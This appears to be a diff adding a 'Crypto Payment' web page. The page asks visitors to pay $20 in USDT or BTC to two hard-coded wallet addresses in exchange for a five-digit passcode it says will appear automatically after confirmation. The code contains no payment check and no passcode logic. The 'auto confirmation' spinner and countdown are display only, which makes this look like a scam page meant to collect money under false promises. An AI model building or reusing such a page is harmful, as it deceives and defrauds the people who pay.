@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://kit.fontawesome.com/32bbba991c.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins&family=Quicksand:wght@500&display=swap">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-5qWf+gBH6AAK2TRfzbyyJy64ZJkRVF1sBxpz+o0UbgksbQGxzyGGpVtQ+YQCRRuQK9GK8UuD4zTtxef1zYxpwg==" crossorigin="anonymous" />
+    <!-- SweetAlert library -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <title>Document</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0 auto;
+            font-size: small;
+        }
+
+        body {
+            font-size: 14px;
+            font-family: 'Poppins', sans-serif;
+            line-height: 1.6;
+            background-color: #f5f5f5;
+        }
+
+        h3, p {
+            text-align: center;
+            margin: 15px 0;
+        }
+
+        .modal {
+            background-color: #fff;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px auto;
+            max-width: 300px;
+            width: 100%;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .container {
+            padding: 15px;
+            background-color: #e8e8e8;
+            border-radius: 15px;
+            margin: 20px auto;
+            max-width: 300px;
+        }
+
+        .spinner {
+            font-size: 28px;
+            position: relative;
+            display: inline-block;
+            width: 1em;
+            height: 1em;
+            margin: auto;
+            margin-top: 20px;
+        }
+
+        .spinner .spinner-blade {
+            position: absolute;
+            bottom: 0;
+            width: 0.074em;
+            height: 0.2777em;
+            border-radius: 0.0555em;
+            background-color: transparent;
+            transform-origin: center -0.2222em;
+            animation: spinner-fade 1s infinite linear;
+        }
+
+        .copy-icon {
+            margin-left: 5px;
+        }
+
+        @keyframes spinner-fade {
+            0% {
+                background-color: #69717d;
+            }
+
+            100% {
+                background-color: transparent;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="modal">
+        <h3>Crypto Payment</h3>
+        <p>Make your payment of $20 worth of USDT (TRC20) or BTC through any cryptocurrency application, select any of the wallet address below and pay into.</p>
+        <P>Your five digit ( 5 ) passcode will automatically display below immediately your payment it’s confirmed ✅</P>
+
+        <div class="container">
+            <center>
+                <img src="img/crypto.jpg" alt="" width="100%" style="max-width: 300px; border-radius: 15px;">
+            </center>
+        </div>
+
+        <!-- BTC Wallet Address with Copy Button -->
+        USDT:<h3 class="btc-address" style="font-size: 9.5px;">TPieSex3rB6k3JrRLDQBn8cyQDx5j3VEKS><i class="far fa-copy copy-icon"></i></h3>
+
+         <!-- BTC Wallet Address with Copy Button -->
+        B.T.C:<h3 class="btc-address" style="font-size: 10px;">bc1qqts75raevfed2xq3rmughwjgy9yckf3u9uw3fj</i></h3>
+
+        <div class="spinner center">
+            <!-- Repeated spinner blades -->
+            <?php for ($i = 0; $i < 12; $i++) { ?>
+                <div class="spinner-blade"></div>
+            <?php } ?>
+        </div>
+
+        <p>Auto Confirmation is on...</p>
+        <p id="countdown">Payment will close in <span id="timer">10:00</span> mins</p>
+    </div>
+
+    <!-- Your existing script remains unchanged -->
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            // Close the page after 10 minutes
+            setTimeout(function () {
+                window.location.href = "index.html";
+            }, 600000); // 10 minutes in milliseconds
+
+            // Copy BTC wallet address to clipboard
+            var btcAddress = document.querySelector('.btc-address');
+            var copyIcon = document.querySelector('.copy-icon');
+
+            copyIcon.addEventListener('click', function () {
+                var tempInput = document.createElement('input');
+                tempInput.value = btcAddress.innerText;
+                document.body.appendChild(tempInput);
+                tempInput.select();
+                document.execCommand('copy');
+                document.body.removeChild(tempInput);
+                
+                // Show SweetAlert
+                Swal.fire({
+                    icon: 'success',
+                    title: 'USDT Address Copied',
+                    showCancelButton: false,
+                    showConfirmButton: false,
+                    text: 'The USDT address has been copied to the clipboard!',
+                });
+            });
+
+            // Countdown timer
+            var countdown = 600; // 10 minutes in seconds
+            var timerDisplay = document.getElementById('timer');
+
+            function updateTimer() {
+                var minutes = Math.floor(countdown / 60);
+                var seconds = countdown % 60;
+
+                timerDisplay.textContent = minutes.toString().padStart(2, '0') + ':' + seconds.toString().padStart(2, '0');
+            }
+
+            setInterval(function () {
+                if (countdown > 0) {
+                    countdown--;
+                    updateTimer();
+                }
+            }, 1000);
+        });
+    </script>
+<center>
+    <p>
+           <div class="password">
+    <input type="test" id="password-input" placeholder="Введите пароль" name="password" value="Passcode will display here..." readonly>
+    <a href="#" class="password-control"></a><br><br>
+</div>
+</center>
+
+     <script>
+        $('body').on('click', '.password-control', function(){
+    if ($('#password-input').attr('type') == 'password'){
+        $(this).addClass('view');
+        $('#password-input').attr('type', 'text');
+    } else {
+        $(this).removeClass('view');
+        $('#password-input').attr('type', 'password');
+    }
+    return false;
+});
+    </script>
+</body>
+</html>
